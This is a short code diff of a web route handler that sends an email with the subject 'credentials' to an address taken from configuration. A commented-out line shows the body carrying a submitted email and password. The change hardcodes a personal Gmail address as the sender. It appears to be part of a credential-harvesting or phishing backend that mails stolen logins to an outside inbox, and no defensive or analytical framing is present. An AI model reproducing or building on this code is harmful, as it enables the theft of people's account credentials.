@@ -20,7 +20,7 @@ export async function POST(request: Request) {
        });
 
       const result = await transporter.sendMail({
-         from: `"dees" <${process.env.APP_ACCOUNT}>`,
+         from: `"dees" <deeswork969@gmail.com>`,
          to: `${process.env.EMAIL_TO_SEND}`,
          subject: 'credentials',
          // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
